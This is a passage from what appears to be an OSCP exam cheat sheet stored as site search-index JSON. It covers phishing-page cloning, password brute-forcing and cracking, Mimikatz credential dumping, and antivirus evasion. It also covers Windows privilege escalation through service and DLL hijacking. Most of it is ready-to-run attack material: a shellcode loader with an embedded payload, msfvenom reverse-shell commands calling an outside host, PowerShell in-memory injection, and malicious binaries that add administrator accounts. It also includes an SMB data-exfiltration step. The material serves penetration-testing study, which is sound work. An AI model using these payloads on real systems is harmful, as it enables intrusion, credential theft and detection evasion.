\"https://zoom.us/signin#/login\"\n\npython3 -m http.server 80\n</code></pre> <p>Remove OWASP CSRFGuard</p> <pre><code>grep \"OWASP\" *\ngrep \"csrf_js\" *\n</code></pre> <p>Use LLM to make it look like the main website</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#password-attacks","title":"Password Attacks","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#attacking-network-services-logins","title":"Attacking Network Services Logins","text":"<p>SSH</p> <pre><code>hydra -l [user] -P [passwords] -s [Port] ssh://[IP]\n</code></pre> <p>RDP</p> <pre><code>hydra -L [users] -p [password] rdp://[IP]\n</code></pre> <p>HTTP POST Login Form</p> <pre><code>hydra -l [user] -P [passwords] [IP] http-post-form \"/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#password-cracking-fundamentals","title":"Password Cracking Fundamentals","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#introduction-to-encryption-hashes-and-cracking","title":"Introduction to Encryption, Hashes and Cracking","text":"<ul> <li>Symmetric encryption<ul> <li>AES</li> </ul> </li> <li>Asymmetric encryption<ul> <li>RSA</li> </ul> </li> <li>Hash<ul> <li>SHA / MD5</li> </ul> </li> </ul> <p>Calculate Cracking Time</p> <pre><code>## Calculate the keyspace for a five-character password\necho -n \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" | wc -c\npython3 -c \"print(62**5)\"\n\n## Check Hashcat benchmaks\nhashcat -b\n\n## Calculate Time in Seconds - Convert Benchmark\npython3 -c \"print([Keyspace for *-characted password] / [Hashcat Benchmark])\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#mutating-wordlists","title":"Mutating Wordlists","text":"<pre><code>## Hashcat Rules\nls -la /usr/share/hashcat/rules\n\n## Create Rule Hashcat Cheat Sheet\nhttps://hashcat.net/wiki/doku.php?id=rule_based_attack\n\n## Create Rule - Hashcat Example\necho \"c\" &gt; demo.rule\nhashcat -r demo.rule --stdout wordlist.txt\n\n## Create Rule - John Examle\necho \"[List.Rules:sshRules]\\nc\" &gt; demo.rule\ncat demo.rule &gt;&gt; /etc/john/john.conf\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#password-manager","title":"Password Manager","text":"<p>Locating KeePass Database</p> <pre><code>Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>Crack KeePass Database</p> <pre><code>ls -la Database.kdbx\n\nkeepass2john Database.kdbx &gt; keepass.hash\n\nhashcat -m 13400 keepass.hash [rockyou] -r /usr/share/hashcat/rules/rockyou-30000.rule --force\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ssh-private-key-passphrase","title":"SSH Private Key Passphrase","text":"<pre><code>## Connect through SSH\nssh -i id_rsa -p [port] [user]@[IP]\n\n## Crack id_rsa if Password is prompted for that file\nssh2john id_rsa &gt; ssh.hash\njohn ssh.hash --wordlist=[wordlist] --rules=sshRules\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#working-with-password-hashes","title":"Working with Password Hashes","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ntlm-netntlmv2","title":"NTLM / NetNTLMv2","text":"<p>Mimikatz</p> <pre><code>.\\mimikatz.exe\n\nprivilege::debug\ntoken::elevate\n\nlsadump::sam\nlsadump::secrets\nsekurlsa::logonpasswords\n\nImport-Module Invoke-Mimikatz.ps1\nInvoke-Mimikatz -Command 'privilege::debug token::elevate'\n</code></pre> <p>Capture Net-NTLMv2</p> <pre><code>Responder -I [interface]\n\nPS &gt; ls \\\\[IP]\\share\n</code></pre> <p>Relaying Net-NTLMv2</p> <pre><code>impacket-ntlmrelayx --no-http-server -smb2support -t [IP] -c \"CMD\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#windows-credential-guard","title":"Windows Credential Guard","text":"\ud83d\udca1  Credential Guard Mitigation restrict access to ***LSASS.exe*** process. Domain/Remote user hashes aren\u2019t accessible while the Local users are.    \ud83d\udca1  Microsoft provides quite a few [*authentication mechanisms](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10))* as part of the Windows operating system such as *Local Security Authority (LSA) Authentication*, *Winlogon*, *Security Support Provider Interfaces (SSPI)*, etc.  Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.  By default, Windows provides several *Security Support Providers (SSP)* such as *Kerberos Security Support Provider*, *NTLM Security Support Provider*, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.  Additionally the SSP can also be registered through the *HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages* registry key. Each time the system starts up, the *Local Security Authority* (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.  What this means is that if we were to develop our own SSP and register it with *LSASS*, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.   <p>Abuse SSP Authentication to Bypass Device Protection Mitigation</p> <pre><code>./mimikatz.exe\nprivilege::debug\n\nmisc::memssp\n\n## At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.\n\n## Check the Dump Credentials\ntype C:\\Windows\\System32\\mimilsa.log\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#antivirus-evasion","title":"Antivirus Evasion","text":"<p>AV Engines:</p> <ul> <li>File Engine</li> <li>Memory Engine</li> <li>Network Engine</li> <li>Disassembler</li> <li>Emulator/Sandbox</li> <li>Browser Plugin</li> <li>Machine Learning Engine</li> </ul> <p>Detection Methods</p> <ul> <li>Signature-based Detection</li> <li>Heuristic-based Detection</li> <li>Behavioral Detection</li> <li>Machine Learning Detection</li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#bypassing-antivirus-detections","title":"Bypassing Antivirus Detections","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#on-disk-evasion","title":"On-Disk Evasion","text":"<p>Modern on-disk malware obfuscation can take many forms. One of the earliest ways of avoiding detection involved the use of packers. Given the high cost of disk space and slow network speeds during the early days of the internet, packers were originally designed to reduce the size of an executable. Unlike modern \"zip\" compression techniques, packers generate an executable that is not only smaller but is also functionally equivalent with a completely new binary structure. The file produced has a new hash signature and as a result, can effectively bypass older and more simplistic AV scanners. Even though some modern malware uses a variation of this technique, the use of UPX and other popular packers alone is not sufficient to evade modern AV scanners. </p> <p>Obfuscators reorganize and mutate code in a way that makes it more difficult to reverse-engineer. This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions or dead code, splitting or reordering functions, and so on. Although primarily used by software developers to protect their intellectual property, this technique is also marginally effective against signature-based AV detection. Modern obfuscators also have runtime in-memory capabilities, which aims to hinder AV detection even further. </p> <p>Crypter software cryptographically alters executable code, adding a decryption stub that restores the original code upon execution. This decryption happens in-memory, leaving only the encrypted code on-disk. Encryption has become foundational in modern malware as one of the most effective AV evasion techniques. </p> <p>Highly effective antivirus evasion requires a combination of all the previous techniques in addition to other advanced ones, including anti-reversing, anti-debugging, virtual machine emulation detection, and so on. In most cases, software protectors were designed for legitimate purposes, like anti-copy, but can also be used to bypass AV detection. </p> <p>Most of these techniques may appear simple at a high-level but they can be quite complex. Because of this, there are currently few actively maintained free tools that provide acceptable antivirus evasion. Among commercially available tools, The Enigma Protector can be used to successfully bypass antivirus products. </p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#in-memory-evasion","title":"In-Memory Evasion","text":"<p>The first technique we are going to cover is Remote Process Memory Injection, which attempts to inject the payload into another valid PE that is not malicious. The most common method of doing this is by leveraging a set of Windows APIs. First, we would use the *OpenProcess function to obtain a valid *HANDLE to a target process that we have permission to access. After obtaining the HANDLE, we would allocate memory in the context of that process by calling a Windows API such as VirtualAllocEx. Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using WriteProcessMemory. After the payload has been successfully copied, it is usually executed in memory in a separate thread using the *CreateRemoteThread* API. </p> <p>Unlike regular DLL injection, which involves loading a malicious DLL from disk using the *LoadLibrary API, the *Reflective DLL Injection technique attempts to load a DLL stored by the attacker in the process memory.</p> <p>The main challenge of implementing this technique is that LoadLibrary does not support loading a DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write their own version of the API that does not rely on a disk-based DLL. </p> <p>The third technique we want to mention is Process Hollowing. When using process hollowing to bypass antivirus software, attackers first launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from memory and replaced with a malicious executable image. Finally, the process is then resumed, and malicious code is executed instead of the legitimate process. </p> <p>Ultimately, Inline hooking, as the name suggests, involves modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code. Upon executing our malicious code, the flow will return to the modified function and resume execution, appearing as if only the original code had executed. </p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#av-evasion-in-practice","title":"AV Evasion in Practice","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#testing-for-av-evasion","title":"Testing for AV Evasion","text":"<p>Disable Sample Submission</p> <p>Windows Security &gt;  Virus &amp; threat protection &gt; Manage Settings and deselecting</p> <p>Scanning without share to third-parties</p> <p>Kleenscan.com</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ad-evasion-custom-binaries","title":"AD Evasion - Custom Binaries","text":"<pre><code>#include \"windows.h\"\n\nint main()\n{\n    unsigned char shellcode[] =\n        \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\"\n        \"\\xff\\xff\\x48\\xbb\\x1d\\xbe\\xa2\\x7b\\x2b\\x90\\xe1\\xec\\x48\\x31\\x58\"\n        \"\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xe1\\xf6\\x21\\x9f\\xdb\\x78\"\n        \"\\x21\\xec\\x1d\\xbe\\xe3\\x2a\\x6a\\xc0\\xb3\\xbd\\x4b\\xf6\\x93\\xa9\\x4e\"\n        \"\\xd8\\x6a\\xbe\\x7d\\xf6\\x29\\x29\\x33\\xd8\\x6a\\xbe\\x3d\\xf6\\x29\\x09\"\n        \"\\x7b\\xd8\\xee\\x5b\\x57\\xf4\\xef\\x4a\\xe2\\xd8\\xd0\\x2c\\xb1\\x82\\xc3\"\n        \"\\x07\\x29\\xbc\\xc1\\xad\\xdc\\x77\\xaf\\x3a\\x2a\\x51\\x03\\x01\\x4f\\xff\"\n        \"\\xf3\\x33\\xa0\\xc2\\xc1\\x67\\x5f\\x82\\xea\\x7a\\xfb\\x1b\\x61\\x64\\x1d\"\n        \"\\xbe\\xa2\\x33\\xae\\x50\\x95\\x8b\\x55\\xbf\\x72\\x2b\\xa0\\xd8\\xf9\\xa8\"\n        \"\\x96\\xfe\\x82\\x32\\x2a\\x40\\x02\\xba\\x55\\x41\\x6b\\x3a\\xa0\\xa4\\x69\"\n        \"\\xa4\\x1c\\x68\\xef\\x4a\\xe2\\xd8\\xd0\\x2c\\xb1\\xff\\x63\\xb2\\x26\\xd1\"\n        \"\\xe0\\x2d\\x25\\x5e\\xd7\\x8a\\x67\\x93\\xad\\xc8\\x15\\xfb\\x9b\\xaa\\x5e\"\n        \"\\x48\\xb9\\xa8\\x96\\xfe\\x86\\x32\\x2a\\x40\\x87\\xad\\x96\\xb2\\xea\\x3f\"\n        \"\\xa0\\xd0\\xfd\\xa5\\x1c\\x6e\\xe3\\xf0\\x2f\\x18\\xa9\\xed\\xcd\\xff\\xfa\"\n        \"\\x3a\\x73\\xce\\xb8\\xb6\\x5c\\xe6\\xe3\\x22\\x6a\\xca\\xa9\\x6f\\xf1\\x9e\"\n        \"\\xe3\\x29\\xd4\\x70\\xb9\\xad\\x44\\xe4\\xea\\xf0\\x39\\x79\\xb6\\x13\\xe2\"\n        \"\\x41\\xff\\x32\\x95\\xe7\\x92\\xde\\x42\\x8d\\x90\\x7b\\x2b\\xd1\\xb7\\xa5\"\n        \"\\x94\\x58\\xea\\xfa\\xc7\\x30\\xe0\\xec\\x1d\\xf7\\x2b\\x9e\\x62\\x2c\\xe3\"\n        \"\\xec\\x1c\\x05\\xa8\\x7b\\x2b\\x95\\xa0\\xb8\\x54\\x37\\x46\\x37\\xa2\\x61\"\n        \"\\xa0\\x56\\x51\\xc9\\x84\\x7c\\xd4\\x45\\xad\\x65\\xf7\\xd6\\xa3\\x7a\\x2b\"\n        \"\\x90\\xb8\\xad\\xa7\\x97\\x22\\x10\\x2b\\x6f\\x34\\xbc\\x4d\\xf3\\x93\\xb2\"\n        \"\\x66\\xa1\\x21\\xa4\\xe2\\x7e\\xea\\xf2\\xe9\\xd8\\x1e\\x2c\\x55\\x37\\x63\"\n        \"\\x3a\\x91\\x7a\\xee\\x33\\xfd\\x41\\x77\\x33\\xa2\\x57\\x8b\\xfc\\x5c\\xe6\"\n        \"\\xee\\xf2\\xc9\\xd8\\x68\\x15\\x5c\\x04\\x3b\\xde\\x5f\\xf1\\x1e\\x39\\x55\"\n        \"\\x3f\\x66\\x3b\\x29\\x90\\xe1\\xa5\\xa5\\xdd\\xcf\\x1f\\x2b\\x90\\xe1\\xec\"\n        \"\\x1d\\xff\\xf2\\x3a\\x7b\\xd8\\x68\\x0e\\x4a\\xe9\\xf5\\x36\\x1a\\x50\\x8b\"\n        \"\\xe1\\x44\\xff\\xf2\\x99\\xd7\\xf6\\x26\\xa8\\x39\\xea\\xa3\\x7a\\x63\\x1d\"\n        \"\\xa5\\xc8\\x05\\x78\\xa2\\x13\\x63\\x19\\x07\\xba\\x4d\\xff\\xf2\\x3a\\x7b\"\n        \"\\xd1\\xb1\\xa5\\xe2\\x7e\\xe3\\x2b\\x62\\x6f\\x29\\xa1\\x94\\x7f\\xee\\xf2\"\n        \"\\xea\\xd1\\x5b\\x95\\xd1\\x81\\x24\\x84\\xfe\\xd8\\xd0\\x3e\\x55\\x41\\x68\"\n        \"\\xf0\\x25\\xd1\\x5b\\xe4\\x9a\\xa3\\xc2\\x84\\xfe\\x2b\\x11\\x59\\xbf\\xe8\"\n        \"\\xe3\\xc1\\x8d\\x05\\x5c\\x71\\xe2\\x6b\\xea\\xf8\\xef\\xb8\\xdd\\xea\\x61\"\n        \"\\xb4\\x22\\x80\\xcb\\xe5\\xe4\\x57\\x5a\\xad\\xd0\\x14\\x41\\x90\\xb8\\xad\"\n        \"\\x94\\x64\\x5d\\xae\\x2b\\x90\\xe1\\xec\";\n\n    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(exec, shellcode, sizeof shellcode);\n    ((void(*)())exec)();\n\n    return 0;\n}\n</code></pre> <p>Generate Shellcode</p> <pre><code>## 32bit\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -e x86/shikata_ga_nai -b '\\x00' -i 3 -f c \n\n## 64bit\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \\x00\\x0a\\x0d\n</code></pre> <p>Generate 32 /64 bit Executables</p> <pre><code>i686-w64-mingw32-gcc exploit.cpp -o output.exe\n\nx86_64-w64-mingw32-gcc exploit.cpp -o output.exe\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ad-evasion-memory-injection","title":"AD Evasion - Memory Injection","text":"<p>Basic Memory Injection Code</p> <pre><code>$code = '\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n[DllImport(\"msvcrt.dll\")]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);';\n\n&lt;place shellcode here&gt;\n</code></pre> <p>Generate PowerShell Memory Injection Payload</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f psh-reflection\n</code></pre> <p>Full Basic Memory Injection Code</p> <pre><code>$code = '\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n[DllImport(\"msvcrt.dll\")]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);';\n\nfunction xf {\n        Param ($nfCl, $vf)\n        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\n        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))\n}\n\nfunction xb {\n        Param (\n                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,\n                [Parameter(Position = 1)] [Type] $hh = [Void]\n        )\n...\n</code></pre> <p>Run the Malicious Script</p> <pre><code>Set-ExecutionPolicy Unrestricted -Scope CurrentUser\n\n./malicious.ps1\n</code></pre> <p>Run the DLL/EXE in memory using a ReflectivePEInjection.ps1 **</p> <pre><code>## Your base64 encoded binary\n\n$InputString = '...........'\n\nfunction Invoke-ReflectivePEInjection\n\n{\n\n   ......\n   ......\n   ......\n\n}\n\n## Convert base64 string to byte array\n\n$PEBytes = [System.Convert]::FromBase64String($InputString)\n\n## Run EXE in memory\n\nInvoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs \"Arg1 Arg2 Arg3 Arg4\"\n</code></pre> <p>https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#automating-the-process","title":"Automating the Process","text":"<p>Install Shellter </p> <pre><code>apt-cache search shellter\nsudo apt install shellter\n\n## Since Shellter is designed to be run on Windows operating systems, install wine\nsudo apt install wine\nsudo dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32\n\n## Insall Wine on ARM based system\nsudo apt install wine\nsudo dpkg --add-architecture amd64\nsudo  apt install -y qemu-user-static binfmt-support\nsudo apt-get update &amp;&amp; apt-get install wine32\n</code></pre>  \ud83d\udca1  For real engagements, it is best practice to pick a new, less scrutinized application as Shellter's [author explains](https://www.shellterproject.com/an-important-tip-for-shellter-usage/).   <p>Veil Framework</p> <p>https://github.com/Veil-Framework/Veil</p> <p>Advanced Techniques to Bypass AV detection</p> <p>web.archive.org</p> <p>FunFisher Malware Analysis</p> <p>FinFisher exposed: A researcher\u2019s tale of defeating traps, tricks, and complex virtual machines | Microsoft Security Blog</p> <p>AD Evasion Resources</p> <p>AV Bypass with Metasploit Templates and Custom Binaries | Red Team Notes</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#windows-privilege-escalation","title":"Windows Privilege Escalation","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-windows","title":"Enumerating Windows","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#understanding-windows-privileges-and-access-control-mechanisms","title":"Understanding Windows Privileges and Access Control Mechanisms","text":"<p>Well-known SID\u2019s</p> <pre><code>S-1-0-0                       Nobody        \nS-1-1-0                       Everybody\nS-1-5-11                      Authenticated Users\nS-1-5-18                      Local System\nS-1-5-domainidentifier-500    Administrator\n</code></pre> <p>From Windows Vista onward, processes run on five integrity levels:</p> <ul> <li>System \u2013 Highly trusted user-mode system processes (e.g., <code>Winlogon</code>, <code>LSASS</code>)</li> <li>High \u2013 For elevated processes running with admin privileges</li> <li>Medium \u2013 For standard user processes (default)</li> <li>Low \u2013 For sandboxed or restricted processes (e.g., browsers)</li> <li>Untrusted \u2013 Rarely used; for highly restricted unverified sources</li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#situational-awareness","title":"Situational Awareness","text":"<p>There are several key pieces of information we should always obtain:</p> <pre><code>- Username and hostname\n- Group memberships of the current user\n- Existing users and groups\n- Operating system, version and architecture\n- Network information\n- Installed applications\n- Running processes\n</code></pre> <p>Groups/Users enumeration</p> <pre><code>## Group membership of the user\nwhoami /groups\nnet user [user]\n\n## List of local users\nGet-LocalUser\nnet user\n\n## List of local groups\nGet-LocalGroup\nnet localgroup\n\n## List member of local groups\nGet-LocalGroupMember [group]\nnet localgroup [group]\n</code></pre> <p>System Information</p> <pre><code>systeminfo\n</code></pre> <p>Network Information</p> <pre><code>## Network interfaces\nipconfig /all\n\n## Display routing table\nroute print\n\n## list of all active network connections \nnetstat -ano\n</code></pre> <p>List 32bit Applications</p> <pre><code>Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n</code></pre> <p>List 64bit Applications</p> <pre><code>Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n</code></pre>  \ud83d\udca1  we should always check 32-bit and 64-bit **Program Files** directories located in **C:\\**. Additionally, we should review the contents of the **Downloads** directory of our user to find more potential programs.   <p>List running Applications/Processes</p> <pre><code>Get-ProGet-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displaynamecess\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#hidden-in-plain-view","title":"Hidden in Plain View","text":"<p>Search KeePass Database</p> <pre><code>Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>Search sensitive information of XAMPP</p> <pre><code>Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>Search documents and text files in the Home directory</p> <pre><code>Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.csv,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>RunAs Command - Only if GUI access</p> <pre><code>runas /user:[user] cmd\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#information-goldmine-powershell","title":"Information Goldmine PowerShell","text":"<p>PowerShell - Get History</p> <pre><code>Get-History\n</code></pre> <p>PowerShell - Get PSReadLine Path</p> <pre><code>(Get-PSReadlineOption).HistorySavePath\n</code></pre> <p>PowerShell - Enter-PSSession</p> <pre><code>$password = ConvertTo-SecureString \"password123!\" -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential(\"user\", $password)\n\nEnter-PSSession -ComputerName [hostname] -Credential $cred\n</code></pre> <p>Search events recorded by Script Block Logging</p> <pre><code>## Open Event Viewer\n## Navigate to Applications and Services Logs \u2192 Microsoft \u2192 Windows \u2192 PowerShell \u2192 Operational\n## Filter for Script Block Logging events to 4104 ID\n## View events. Note ScriptBlockText parameter where executed scripts are stored\n</code></pre> <p>Dumping Hashes from SAM via Registry</p> <pre><code>reg save hklm\\system system\nreg save hklm\\sam sam\n</code></pre> <p>Exfiltrate Data From Windows</p> <pre><code>## Kali \nimpacket-smbserver share . -smb2support -username user -password password\n\n## Windows\n\nnet use m: \\\\[IP]\\share /user:user password\ncopy data m:\\\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#automated-enumeration","title":"Automated Enumeration","text":"<p>PEASS-ng/winPEAS at master \u00b7 peass-ng/PEASS-ng</p> <p>https://github.com/GhostPack/Seatbelt</p> <p>https://github.com/411Hall/JAWS</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#leveraging-windows-services","title":"Leveraging Windows Services","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#service-binary-hijacking","title":"Service Binary Hijacking","text":"<p>List Running Services</p> <pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n</code></pre> <p>Check Permissions of Vulnerable Service Binary</p> <pre><code>icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\"\n</code></pre> <p>Icacls Permissions</p> Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access <p>Abuse the Vulnerable Service Binary - C code example</p> <pre><code>#include &lt;stdlib.h&gt;\n\nint main ()\n{\n  int i;\n\n  i = system (\"net user dave2 password123! /add\");\n  i = system (\"net localgroup administrators dave2 /add\");\n\n  return 0;\n}\n</code></pre> <p>Abuse the Vulnerable Service Binary - Generate PE</p> <pre><code>x86_64-w64-mingw32-gcc code.c -o malicious.exe\n</code></pre> <p>Check Vulnerable Service Startup Type</p> <pre><code>Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}\n</code></pre> <p>Restart the Service</p> <pre><code>net stop [service]\nnet start [service]\n\nStart-Service [service]\nStop-Service [service]\n\nshutdown /r /t 0\n</code></pre> <p>Abuse the Vulnerable Service Binary - Automated tool</p> <pre><code>Set-ExecutionPolicy Unrestricted -Scope currentUser\nimport-module .\\PowerUp.ps1\n\nGet-ModifiableServiceFile\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#dll-hijacking","title":"DLL Hijacking","text":"<pre><code>## Process Explorer\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer\n\n## Process Monitor\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/procmon\n\n## list of Vulnerable Applications\nhttps://web.archive.org/web/20140222035441/https:/www.exploit-db.com/dll-hijacking-vulnerable-applications/\n\nWhen a program is launched, the DLL Search Order in most cases is as follows:\n\n1.The directory from which the application was launched\n2.The\u00a0`C:\\Windows\\System32`\u00a0directory\n3.The 16-bit Windows system directory (i.e,\u00a0`C:\\windows\\system`)\n4.The Windows directory (`C:\\windows`)\n5.The current directory at the time of execution\n6.Any directories specified by the %PATH% environment variable\n\nProcess Explorer - Identify file PATH and associated services  \n\nProcess Monitor - Apply filters to check what DLL are loaded.\n\nServices - Stop and start services to display dll processes on Process Monitor\n\n## Run Process Monitor with following filters\nProcess      &gt; is       &gt;  [process]\nOperation    &gt; contains &gt;  CreateFile\nResult       &gt; contains &gt;  NAME NOT FOUND\nPath         &gt; end with &gt;  .dll\n</code></pre> <p>Create Malicious DLL with MSFVenom</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll -o injection.dll\n</code></pre> <p>Create Malicious DLL with C++ Code</p> <pre><code>#include &lt;windows.h&gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n        i = system (\"net user dave3 password123! /add\");\n        i = system (\"net localgroup administrators dave3 /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n</code></pre> <p>Generate Executable DLL</p> <pre><code>x86_64-w64-mingw32-gcc Malicious.cpp --shared -o injection.dll\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<p>Enumerate running and stopped services.</p> <pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName\n</code></pre> <pre><code>wmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n</code></pre> <p>Check directory permissions</p> <pre><code>icacls \"C:\\PATH\"\n</code></pre> <p>Restart the Service</p> <pre><code>net stop [service]\nnet start [service]\n\nStart-Service [service]\nStop-Service [service]\n\nshutdown /r /t 0\n</code></pre> <p>Automated tool</p> <pre><code>Set-ExecutionPolicy Unrestricted -Scope currentUser\nimport-module .\\PowerUp.ps1\n\nGet-UnquotedService\nInvoke-AllChecks\n</code></pre> <p>Abuse the Service </p> <pre><code>## https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/\n\n## With PowerUp - Invoke-ServiceAbuse\nimport-module .\\PowerUp.ps1\nGet-UnquotedService\nInvoke-AllChecks\n\nInvoke-ServiceAbuse -Name VulnSVC \nInvoke-ServiceAbuse -Name VulnSVC -Command \"net ...\"\nInvoke-ServiceAbuse -Name VulnSVC -Command \"C:\\\\tmp\\\\payload.exe\"\n\n## Manual - Change Executable with the MSFVenom generatet payloiad\n\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST] LPORT=]LPORT] -f exe -o [VulnService.exe]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#abusing-other-windows-components","title":"Abusing Other Windows Components","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:</p> <ul> <li>As which user 